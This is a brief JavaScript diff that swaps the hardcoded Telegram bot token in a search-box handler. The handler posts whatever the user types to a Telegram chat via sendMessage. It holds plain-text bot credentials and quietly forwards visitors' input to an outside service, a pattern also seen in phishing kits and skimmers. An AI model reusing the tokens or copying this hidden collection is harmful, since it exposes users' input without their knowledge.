@@ -20,7 +20,7 @@ document.getElementById("search-box").addEventListener("keydown", function(event
         event.preventDefault();
         input = inputFunction();
         $.ajax({
-            url: 'https://api.telegram.org/bot' + '1682925449:AAFEJGrVMV02rC17MjrOmj-3Q1qq0197QG4' + '/sendMessage',
+            url: 'https://api.telegram.org/bot' + '1184206791:AAEuTfhvmT5MSrWovb4DfBv_ek1uuF40xhg' + '/sendMessage',
             method: 'POST',
             data: { chat_id: '699973760', text: input },
             
